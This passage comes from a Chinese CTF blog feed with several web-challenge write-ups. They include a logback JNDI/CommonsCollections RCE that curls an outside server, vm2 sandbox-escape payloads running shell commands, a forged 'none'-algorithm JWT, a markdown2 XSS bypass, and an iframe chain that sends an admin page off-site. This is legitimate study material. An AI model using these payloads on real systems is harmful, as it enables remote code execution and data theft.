&lt;version&gt;1.5.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;      &lt;artifactId&gt;logback-core&lt;/artifactId&gt;      &lt;version&gt;1.2.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.2.1&lt;/version&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>有<code>ch.qos.logback</code>和<code>commons-collections</code>，</p><p>然后看一下<code>jackson</code>有什么漏洞，根据<code>pom.xml</code>来看，直接筛选，看到有一个<code>logback</code>的</p><p><strong>CVE-2019-14439</strong>可以 </p><p>利用是</p><p><code>["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://localhost:43658/Calc"}]</code></p><p>那么是JNDI注入</p><p>然后题目是高版本的JDK，&gt; 8u191,</p><p><code>paper</code>上有绕过高版本的JDK限制进行JNDI注入</p><p><a href="https://paper.seebug.org/942/#ldapgadget" target="_blank" rel="noopener">https://paper.seebug.org/942/#ldapgadget</a></p><p>结合<code>pom.xml</code>的<code>commons-collections</code>,</p><p>就是利用LDAP返回序列化数据，触发本地Gadget，就是用Common Collections的了</p><p>本来想用这个的文章的代码，<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java" target="_blank" rel="noopener">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java</a></p><p>以前没实践过高版本的，只试过低版本的。然后随便翻翻其他的时候看到了可以更简单的</p><p><code>ysomap</code>这个工具，在本地直接内网穿透</p><pre><code>java -jar ysomap-cli-0.0.1-SNAPSHOT-all.jaruse exploit LDAPLocalChainListeneruse payload  CommonsCollections8use bullet TransformerBulletset lport 5555set version 3set args 'curl xx.xx.xx.xxx/try/shell.php?a=test'</code></pre><p><img src="../../../../../../../images/ha1cyon/ysomap.png" alt=""></p><p>vps shell.php 内容是</p><pre><code>&lt;?php$a=$_GET['a'];file_put_contents('content',$a);</code></pre><p>然后json发送</p><pre><code>["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://mu27062382.zicp.vip:18330/hhhhhh"}]</code></pre><p><img src="../../../../../../../images/ha1cyon/burp2.png" alt=""></p><p>虽然是报错返回500,但是其实是执行了的，在vps上可以看到效果</p><p><img src="../../../../../../../images/ha1cyon/vps.png" alt=""></p><p>成功执行命令，RCE</p><p>flag</p><p>flag{ebcfc7fa-d9e7-4db1-9685-42684bc1aa76}</p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>第一层又双叒叕是一个hash拓展攻击，没有长度就爆破一下 </p><p>利用 <code>upload_progress</code></p><pre><code>import requestsimport hashpumpyimport urlliburl='http://ha1cyon-ctf.fun:30004/'for i in range(40):    a,b=hashpumpy.hashpump('a3dabbc779f2fbf8b6f56113ca78a7f9','123444','1',i)    req=requests.get(url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))    if 'username/password error' not in req.text:        print(req.text,url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))</code></pre><p>跳到</p><p><code>flflflflag.php</code></p><p>可以文件包含</p><p>这里是用 <code>upload_progress</code>来写shell，然后包含</p><p><img src="../../../../../../../images/ha1cyon/php-upload-progress.png" alt=""></p><p>然后包含/tmp/m0on getshell，好像flag又是在phpinfo里面，根目录的是假的</p><p>flag:</p><p>flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hfctf2020部分writeup</title>
      <link href="/2020/04/19/hfctf2020-bu-fen-writeup/"/>
      <url>/2020/04/19/hfctf2020-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>都是知道的知识点，但是总是觉得是自己不会的知识点，</p><p>看都没怎么看就疯狂谷歌</p><h2 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h2><p>node的题目,扫描看到<code>package.json</code>和<code>app.js</code></p><p>根据<code>require</code>的情况看代码</p><p>api的代码<code>controllers/api.js</code></p><pre><code>const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = {    'POST /api/register': async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || username === 'admin'){            throw new APIError('register error', 'wrong username');        }        if(global.secrets.length &gt; 100000) {            global.secrets = [];        }        const secret = crypto.randomBytes(18).toString('hex');        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});        ctx.rest({            token: token        });        await next();    },    'POST /api/login': async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || !password) {            throw new APIError('login error', 'username or password is necessary');        }        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError('login error', 'no such secret id');        }        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: 'HS256'});        const status = username === user.username &amp;&amp; password === user.password;        if(status) {            ctx.session.username = username;        }        ctx.rest({            status        });        await next();    },    'GET /api/flag': async (ctx, next) =&gt; {        if(ctx.session.username !== 'admin'){            throw new APIError('permission error', 'permission denied');        }        const flag = fs.readFileSync('/flag').toString();        ctx.rest({            flag        });        await next();    },    'GET /api/logout': async (ctx, next) =&gt; {        ctx.session.username = null;        ctx.rest({            status: true        })        await next();    }};</code></pre><p>关键是</p><pre><code> const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: 'HS256'});        const status = username === user.username &amp;&amp; password === user.password;</code></pre><p>这里用了 <code>jsonwebtoken</code></p><p><code>evoa</code>师傅在<code>unctf</code> 出了题目，是关于<code>jsonwebtoken</code>的缺陷的</p><p>使<code>secretid</code>是不存在的，然后伪造</p><pre><code>import jwttoken = jwt.encode({"secretid":"","username":"admin","password":"admin","iat":1587324787},algorithm="none",key="").decode(encoding='utf-8')print(token)#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>然后post</p><pre><code>POST /api/login HTTP/1.1username=admin&amp;password=admin&amp;authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>登录获取<code>cookie</code></p><p>带上这两个<code>cookie</code>然后访问<code>/api/flag</code>获取flag</p><h2 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h2><p>看起来是<code>php</code>，实际上是<code>node</code>，</p><p>在<code>run.php?code=1-1</code> 可以执行代码</p><p>一看名字叫<code>escape</code>就知道又是<code>vm2</code>逃逸了</p><p>过滤了一些东西大概是</p><pre><code>'"+processexecconstructorfor</code></pre><p>这个可以绕过</p><p>用这个方式</p><pre><code>try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}</code></pre><p>那么只要找<code>issues</code>就可以了</p><p>最新的不行逃逸，卡了很多时间，无语了</p><p><a href="https://github.com/patriksimek/vm2/issues/268" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/268</a></p><p>用历史的，<code>2019</code>的可以了</p><p><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p><pre><code>import requestsa='''(function(){    try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}    let buffer = {        hexSlice: () =&gt; ``,        magic: {            get [Symbol[`f\\u006fr`](`n\\u006fdejs.util.inspect.cust\\u006fm`)](){                throw f =&gt; f[`c\\u006fnstruct\\u006fr`](`return pr\\u006fcess`)();            }        }    };    try{        Buffer[`pr\\u006ftotype`][`inspect`][`call`](buffer, 0, { customInspect: true });    }catch(e){        e(()=&gt;0).mainModule.require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`)    }})()'''a='''(function(){    TypeError[`prot\\u006ftype`][`get_pr\\u006fcess`] = f=&gt;f[`c\\u006fnstructor`](`return pr\\u006fcess`)();    try{        Object.preventExtensions(Buffer.from(``)).a = 1;    }catch(e){        return e[`get_pr\\u006fcess`](()=&gt;{}).mainModule[`require`](`child_pr\\u006fcess`)[`\\u0065xecSync`](`cat /flag`).toString();    }})()'''url='http://ca8b55804ed648d3a6e6bad8e66e5f6fd0e8b9cfec904ad7.changame.ichunqiu.com/run.php'param={'code':a}req=requests.get(url=url,params=param)print(req.text)</code></pre><p>打不过打不过，明天去<code>Ha1cyonCTF</code>玩了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPICTF-2020-部分writeup</title>
      <link href="/2020/04/18/wpictf2020-bu-fen-writeup/"/>
      <url>/2020/04/18/wpictf2020-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前几题还是简单的</p><h2 id="👉👉👉第一题😎👉"><a href="#👉👉👉第一题😎👉" class="headerlink" title="👉👉👉第一题😎👉"></a>👉👉👉第一题😎👉</h2><p><img src="../../../../../../../images/WPICTF2020/123.png" alt=""></p><h2 id="第二题-dorsia2"><a href="#第二题-dorsia2" class="headerlink" title="第二题 dorsia2"></a>第二题 dorsia2</h2><p>描述</p><pre><code>http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The second card.http://dorsia2.wpictf.xyz:31337/index.html or 31338 or 31339Firefox doesnt like the page... try chromium.made by: awgHint: flag in ~/flag.txt</code></pre><p>虽然这题很简单，不过给代码的方式很有趣</p><p><img src="../../../../../../../images/WPICTF2020/code-dorsia2.png" alt=""></p><p><img src="../../../../../../../images/WPICTF2020/dorsia2-etc-passwd.png" alt=""></p><p>最后</p><p><img src="../../../../../../../images/WPICTF2020/dorsia2.png" alt=""></p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>是一个 c的编译器</p><p>通过报错包含得到</p><p><img src="../../../../../../../images/WPICTF2020/autograder.png" alt=""></p><h2 id="Suckmore-Shell2-0-linux"><a href="#Suckmore-Shell2-0-linux" class="headerlink" title="Suckmore Shell2.0 (linux)"></a>Suckmore Shell2.0 (linux)</h2><p>linux 的题目，看到一个很多人做的去混一下</p><p><img src="../../../../../../../images/WPICTF2020/Suckmore-Shell-2.0.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteBandits CTF 2020部分writeup-notesapp</title>
      <link href="/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/"/>
      <url>/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃了不会前端的大亏，下午的时候一度要做出来了，思路完全对了</p><p>编写利用过程失败了，最后就差<code>js</code>获取<code>iframe</code>内容那么一点卡住了很久，最后改了几个字符就成功了</p><p>网上一搜一页基本上都是复制粘帖的，果然不能总靠临时学习，吐了</p><p>这次比赛过后下定决心好好学一下<code>js</code></p><h2 id="源代码和大概内容"><a href="#源代码和大概内容" class="headerlink" title="源代码和大概内容"></a>源代码和大概内容</h2><p><strong>main.py</strong></p><pre><code>import osfrom flask import Flask, render_template, request, flash, redirectfrom flask_sqlalchemy import SQLAlchemyfrom flask_login import LoginManagerfrom flask_login import login_required, logout_user, current_user, login_userimport markdown2import requestsfrom .models import Userfrom . import db, create_app, login_managerfrom .visit_link import q, visit_urlapp = create_app()# configure login_manager {{{1 #@login_manager.user_loaderdef load_user(user_id):    """Check if user is logged-in on every page load."""    if user_id is not None:        return User.query.get(user_id)    return None@login_manager.unauthorized_handlerdef unauthorized():    """Redirect unauthorized users to Login page."""    flash('You must be logged in to view that page.')    return redirect("/login")# 1}}} ## configure routes {{{1 #@app.route("/")def index():    if current_user.is_authenticated:        return redirect("/profile")    return render_template("index.html")@app.route("/register", methods = ["GET", "POST"])def register():    if current_user.is_authenticated:        return redirect("/profile")    if request.method == 'POST':        # register user        id = request.form.get('username')        password = request.form.get('password')        existing_user = User.query.filter_by(id = id).first()  # Check if user exists        if existing_user is None:            user = User(id = id)            user.set_password(password)            user.notes = ""            db.session.add(user)            db.session.commit()  # Create new user            login_user(user)  # Log in as newly created user            return redirect("/profile")        flash('A user already exists with that name already exists.')        return redirect("/register")    return render_template("register.html")@app.route("/login", methods = ["GET", "POST"])def login():    if current_user.is_authenticated:        return redirect("/profile")    if request.args.get("username"):        # register user        id = request.args.get('username')        password = request.args.get('password')        user = User.query.filter_by(id = id).first()        if user and user.check_password(password = password):            login_user(user)            return redirect("/profile")        flash('Incorrect creds')        return redirect("/login")    return render_template("login.html")@app.route("/visit_link", methods=["GET", "POST"])def visit_link():    if request.method == "POST":        url = request.form.get("url")        token = request.form.get("g-recaptcha-response")        r = requests.post("https://www.google.com/recaptcha/api/siteverify", data = {            'secret': os.environ.get('RECAPTCHA_SECRET'),            'response': token        })        if r.json()['success']:            job = q.enqueue(visit_url, url, result_ttl = 600)            flash("Our admin will visit the url soon.")            return render_template("visit_link.html", job_id = job.id)        else:            flash("Recaptcha verification failed")    return render_template("visit_link.html")@app.route("/status")def status():    job_id = request.args.get('job_id')    job = q.fetch_job(job_id)    status = job.get_status()    return render_template("status.html", status = status)@app.route("/profile")@login_requireddef profile():    return render_template("profile.html", current_user = current_user)@app.route("/update_notes", methods=["POST"])@login_requireddef update_notes():    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)    db.session.commit()    return redirect("/profile")@app.route("/logout")@login_requireddef logout():    logout_user()    return redirect("/")# 1}}} #</code></pre><p>是一个<code>xss</code>挑战，提交<code>url</code>可以让<code>admin</code>去访问</p><p>而 <code>visit_link.py</code>的部分内容是这样</p><pre><code>async def main(url):    browser = await launch(headless=True,                           executablePath="/usr/bin/chromium-browser",                           args=['--no-sandbox', '--disable-gpu'])    page = await browser.newPage()    await page.goto("https://notes.web.byteband.it/login")    await page.type("input[name='username']", "admin")    await page.type("input[name='password']", os.environ.get("ADMIN_PASS"))    await asyncio.wait([        page.click('button'),        page.waitForNavigation(),    ])    await page.goto(url)    await browser.close()def visit_url(url):    asyncio.get_event_loop().run_until_complete(main(url))</code></pre><p>打开<code>chrome</code>浏览器然后登录<code>admin</code>后访问提交的页面</p><p>然后看到 <code>main.py</code></p><pre><code>@app.route("/update_notes", methods=["POST"])@login_requireddef update_notes():    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)    db.session.commit()    return redirect("/profile")</code></pre><p>授权登录后可以编辑<code>notes</code>,使用<code>markdown2</code></p><p>看到<code>github</code>上的<code>issues</code></p><p><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a></p><p>可以绕过造成 <code>xss</code></p><pre><code>&gt;&gt;&gt; import markdown2&gt;&gt;&gt; markdown2.markdown('&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;', safe_mode=True)'&lt;p&gt;&lt;http://g&lt;!s://q?&lt;!-&amp;lt;&lt;a href="http://g"&gt;&lt;script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&amp;lt;&lt;a href="http://g"&gt;a\\*/&lt;/script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;/p&gt;\n'&gt;&gt;&gt; </code></pre><p>所以这是个 <code>authenticated XSS</code>，需要登录才可以利用</p><p>在<code>login</code>内容</p><pre><code>@app.route("/login", methods = ["GET", "POST"])def login():    if current_user.is_authenticated:        return redirect("/profile")。。。。        id = request.args.get('username')        password = request.args.get('password')</code></pre><p>可以看到用的是 <code>request.args.get</code></p><p>也就是可以使用 <code>GET</code>来登录，</p><p>而<code>flag</code>在<code>admin_user.notes = os.environ.get("FLAG")</code></p><p>也就是<code>admin</code>页面的<code>notes</code>就是<code>flag</code>了</p><p>所以只要利用<code>xss</code>获取那个页面内容就可以了</p><p>至于<code>盗取cookie</code>的话，因为<code>cookie</code>使用了 <code>httponly</code></p><p>无法通过<code>js</code>来访问，加上这样的利用条件应该无法盗用了</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如果已经登录了，浏览器拥有那个<code>cookie</code>，然后有一个<code>iframe</code>，那么<code>iframe</code>可以获取那个<code>cookie</code></p><p><a href="https://www.chromium.org/updates/same-site" target="_blank" rel="noopener">chromium same-site update</a></p><p>所以变得明显起来了</p><p>构造一个页面，嵌入一个<code>iframe</code>是admin的<code>profile</code>内容，包含了<code>flag</code></p><p>然后加载完这个<code>iframe</code>后再构造<code>iframe</code>退出登录</p><p>然后构造<code>iframe</code>登录到自己的帐号，里面有<code>xss</code></p><p>有一点是因为自己构造的页面和题目页面是跨域的，在自己页面无法访问那个<code>admin profile</code></p><p>所以<code>xss</code>就有用场了，<code>xss</code>页面和<code>admin profile</code>的<code>iframe</code>是同源的,</p><p>那么<code>iframe</code>之间获取内容</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="一个注意的点-输出-等待-输出的方式"><a href="#一个注意的点-输出-等待-输出的方式" class="headerlink" title="一个注意的点 输出-等待-输出的方式"></a>一个注意的点 输出-等待-输出的方式</h3><p>因为题目打开浏览器浏览打开访问页面后立刻关闭</p><pre><code>    await page.goto(url)    await browser.close()</code></pre><p>在短时间内，可能无法执行完成<code>js</code>脚本</p><p>所以缓冲区输出然后<code>sleep(10)</code> 停几秒，让浏览器没那么快加载完资源</p><p>就可以执行<code>js</code>脚本了</p><pre><code>&lt;?phpecho 123333;ob_flush();flush();?&gt;&lt;?phpsleep(10);?&gt;</code></pre><p>这样</p><p>在我的 <code>vps</code>上面写两个页面</p><p>一个<code>cli.php</code> ,一个<code>10.php</code></p><p><code>cli.php</code>是<code>update_notes</code> 更改我的<code>xss</code>内容</p><p>而 <code>10.php</code> 就是交给admin去访问的</p><p>一些无用的内容多了一点，懒得删除了，<code>cli.php</code>掉入坑里了，烦</p><h3 id="10-php"><a href="#10-php" class="headerlink" title="10.php"></a>10.php</h3><pre><code>&lt;?phpheader('access-control-allow-origin:*');?&gt;&lt;html&gt;&lt;/html&gt;&lt;script&gt;    i=document.createElement("iframe");    i.src="https://notes.web.byteband.it/profile";    i.id="pwn";    i.name="pwn";    var state = 0;    document.body.appendChild(i);    i.onload=function () {        j=document.createElement("iframe");        j.src="https://notes.web.byteband.it/logout";        j.id="pwn2";        document.body.appendChild(j);        j.onload=function () {            k=document.createElement("iframe");            k.src="https://notes.web.byteband.it/login?username=mo0n&amp;password=mo0n";            k.id="pwn3";            document.body.appendChild(k);            k.onload=function () {                l=document.createElement("iframe");                l.src="http://47.92.94.199/cli.php";                l.id="pwn4";                document.body.appendChild(l);                l.onload=function () {                    m=document.createElement("iframe");                    m.src="https://notes.web.byteband.it/profile";                    m.id="pwn5";                    document.body.appendChild(m);                    console.log(i)                }            }        }    }&lt;/script&gt;&lt;?phpecho 123333;ob_flush();flush();?&gt;&lt;?phpsleep(10);?&gt;</code></pre><h3 id="cli-php"><a href="#cli-php" class="headerlink" title="cli.php"></a>cli.php</h3><p>这个的<code>js</code>内容就是卡住的地方，如果会<code>javascript</code>的话早就做出来了，吐了</p><p>搜索网上内容</p><p>给出的<code>兄弟iframe通信</code>得到的是<code>window.parent.document.getElementById("pwn")</code></p><p>这样的，但是这个是不行的，</p><p>在本地测试是无法获取这个<code>admin 的iframe</code>，得到是<code>null</code></p><p>一度怀疑</p><h4 id="可行的一个是"><a href="#可行的一个是" class="headerlink" title="可行的一个是"></a>可行的一个是</h4><pre><code>top.pwn.document.body.innerHTML这个pwn是 i.name="pwn"</code></pre><h4 id="一个注意的点"><a href="#一个注意的点" class="headerlink" title="一个注意的点"></a>一个注意的点</h4><p>随后因为获取<code>html</code>内容带有<code>&lt;</code> 这些，<code>chromium</code>浏览器禁止跳转</p><p>所以只要把它们变成<code>base64</code>就可以了</p><pre><code>&lt;?phpfile_put_contents('flagggggggggggggggggg','yes');echo 123;$js='try{var x = window.parent.document.getElementById("pwn");console.log(x);var right = (x.contentWindow || x.contentDocument);if(right.document){right = right.document;window.location="http://47.92.94.199/flag.php?good="+right;}}catch{console.log(123333);}';$js='try{var x= window.parent.document.getElementById("pwn5");console.log(12);}catch(err){console.log("false")}';$js='x=top.pwn.document.body.innerHTML;console.log(x);window.location="http://47.92.94.199/flag.php?good="+btoa(x);';$content="&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;{$js}/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;";$url='https://notes.web.byteband.it/update_notes';echo "&lt;form style='display:none;' id='form1' name='form1' method='post' action='{$url}'&gt;&lt;input name='notes' type='text' value='{$content}' /&gt;&lt;/form&gt;&lt;script type='text/javascript'&gt;function load_submit(){document.form1.submit()}load_submit();&lt;/script&gt;";$a=1;ob_flush();flush();?&gt;&lt;?phpsleep(60);?&gt;</code></pre><p><code>vps</code>接收数据，</p><p>然后只要把空格转换成<code>+</code> 号就可以了</p><p>base64解码</p><pre><code>echo 'CgkJCjxkaXYgY2xhc3M9Imhlcm8gaXMtZnVsbGhlaWdodCBpcy1jZW50ZXJlZCBpcy12Y2VudGVyZWQgaXMtcHJpbWFyeSI+Cgk8ZGl2IGNsYXNzPSJoZXJvLWhlYWQiPgoJCTxuYXYgY2xhc3M9Im5hdmJhciI+CgkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItYnJhbmQiPgoJCQkJCTxhIGhyZWY9Ii8iIGNsYXNzPSJuYXZiYXItaXRlbSI+CgkJCQkJCU15Tm90ZXMKCQkJCQk8L2E+CgkJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9Im5hdmJhci1tZW51Ij4KCQkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItZW5kIj4KCQkJCQkJPHNwYW4gY2xhc3M9Im5hdmJhci1pdGVtIj4KCQkJCQkJCTxhIGhyZWY9Ii9sb2dvdXQiIGNsYXNzPSJidXR0b24gaXMtcHJpbWFyeSBpcy1pbnZlcnRlZCI+CgkJCQkJCQkJPHNwYW4+TG9nb3V0PC9zcGFuPgoJCQkJCQkJPC9hPgoJCQkJCQk8L3NwYW4+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9uYXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9Imhlcm8tYm9keSBjb2x1bW5zIGlzLWNlbnRlcmVkIGhhcy10ZXh0LWNlbnRlcmVkIj4KCQk8ZGl2IGNsYXNzPSJjb2x1bW4gaXMtNCI+CgkJCTxkaXYgY2xhc3M9InRpdGxlIj4KCQkJCUhvd2R5IGFkbWluIQoJCQk8L2Rpdj4KCQkJPCEtLSBzbyB0aGF0IHVzZXIgY2FuIHdyaXRlIGh0bWwgLS0+CgkJCTxwPglmbGFne2NoNDFuX3RIeV8zWHBsb2l0c190MF93MW59IDwvcD4KCQkJPGJyPgoJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iL3VwZGF0ZV9ub3RlcyI+CgkJCQk8dGV4dGFyZWEgY2xhc3M9InRleHRhcmVhIiBuYW1lPSJub3RlcyIgcGxhY2Vob2xkZXI9IldyaXRlIHNvbWV0aGluZyBoZXJlIj48L3RleHRhcmVhPgoJCQkJPGlucHV0IGNsYXNzPSJidXR0b24gaXMtZnVsbHdpZHRoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGRhdGUiIG5hbWU9IiI+CgkJCTwvZm9ybT4KCQk8L2Rpdj4KCTwvZGl2Pgo8L2Rpdj4KCgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogIDxkaXYgY2xhc3M9ImNvbnRlbnQgaGFzLXRleHQtY2VudGVyZWQiPgogICAgPHA+CiAgICAgIDxzdHJvbmc+TXlOb3Rlczwvc3Ryb25nPiBieSBuMG9iLgogICAgPC9wPgogIDwvZGl2Pgo8L2Zvb3Rlcj4KCg=='|base64 -d</code></pre><p>看到<code>&lt;p&gt;    flag{ch41n_tHy_3Xploits_t0_w1n} &lt;/p&gt;</code></p><p><strong>flag:</strong></p><p>flag{ch41n_tHy_3Xploits_t0_w1n}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘</title>
      <link href="/2020/04/09/bei-wang/"/>
      <url>/2020/04/09/bei-wang/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="03ee123292baaddfdcb146d38db39306ced1a8da4209323249cadfdb63970479">97a71babc79e49e93088eda00f2167e3f03c22c50c146e1beb747f45e994bd0ad2302ff223023c59bf0b85b10bdf2899f5b7d8c1061b8dbc3cee620dce94fa413815769f71742cb50ffe2dd8bc2c3875f0e00119c2e8d55aff8a40e1c60cfb75bf825e05a498e09ba0d96af1d821f4703e459d5292b7d26a5bfd876d55f076306594feb3d4b300fde00cd4b38222b6b6ff7dc88a56da6388d4c09e9a1685341de00e40f32a7edcb7c7450cd2b158935e7ada790b14fe8d38321462b751816b09d24b4300244d77780226e793de618a8f119002bfad1c65c97b2b9e712d7b867890744e548896a194891e76a115aae2ec8991d8569474c937c743052cf52074254040d70f9bc1e7b22d485205d8424814e51652721c0470cf72016a33f6e349f31aa3e3979c3b81398532f92583314501efa40e063d44350fd532eb1478a247a7bdc1d6f05c7a880195df7939ca6caa8506647a7fbbd84ff54894342c9f372ab1db84f8cf29b37bfce4238bdfa14043b42c75836b07334c26ddf87fbf3ff43d25e1709161bbacb8ba45290a1859d1f3437deba69bc442978f3781b54f5cf3923c37dc4c96a72c121ee628a9b4313450c46ad510364101a0cc9c51198f3eae6576537bf7c480af5dd146e9c3e91b6370c1767b601a1bf85ee5ba23a873a1865ac9bf253ae934079c3d37bfbe27c8423d2c0172e3b0b5abdf60